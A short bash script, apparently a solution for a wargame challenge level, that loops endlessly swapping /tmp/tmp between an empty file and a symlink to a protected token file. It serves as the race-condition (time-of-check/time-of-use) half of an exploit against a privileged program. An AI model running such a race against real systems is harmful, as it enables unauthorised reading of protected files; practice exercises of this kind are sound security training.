#!/bin/bash

t=/tmp/tmp

#timeout 2s bash -c '
while true; do
  touch $t
  rm -rf $t
  ln -s /home/user/level10/token $t
  rm -rf $t
done
#'
